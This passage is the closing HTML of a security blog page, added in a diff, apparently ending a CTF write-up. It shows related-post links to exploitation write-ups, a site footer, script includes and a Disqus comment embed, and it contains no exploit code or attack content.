+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h4 class="page__related-title">You May Also Enjoy</h4>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/Chakrazy-exploiting-type-confusion-bug-in-ChakraCore/" rel="permalink">Chakrazy – exploiting type confusion bug in ChakraCore engine
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Introduction
+
+</p>
+  </article>
+</div>
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/Learning-browser-exploitation-via-33C3-CTF-feuerfuchs-challenge/" rel="permalink">Learning browser exploitation via 33C3 CTF  feuerfuchs challenge
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Introduction
+
+</p>
+  </article>
+</div>
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/hxp-CTF-2017-hardened-flag-store/" rel="permalink">hxp CTF 2017 – hardened_flag_store
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Category: Pwnable
+
+</p>
+  </article>
+</div>
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/MeePwn-CTF-2017-Brainfuck-1-2/" rel="permalink">MeePwn CTF 2017 – Brainfuck 1 &amp; 2
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Category: Pwnable
+
+</p>
+  </article>
+</div>
+        
+      </div>
+    </div>
+  
+</div>
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><input type="text" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+    <div id="results" class="results"></div></div>
+      </div>
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2018 Bruce Chen. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script src="https://use.fontawesome.com/releases/v5.2.0/js/all.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+    
+  <script>
+    var disqus_config = function () {
+      this.page.url = "http://0.0.0.0:4000/asis-ctf-finals-2016-car-market/";  // Replace PAGE_URL with your page's canonical URL variable
+      this.page.identifier = "/asis-ctf-finals-2016-car-market"; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+    };
+    (function() { // DON'T EDIT BELOW THIS LINE
+      var d = document, s = d.createElement('script');
+      s.src = 'https://bruce30262logdown.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  </script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+
+  
+
+
+
+  </body>
+</html>
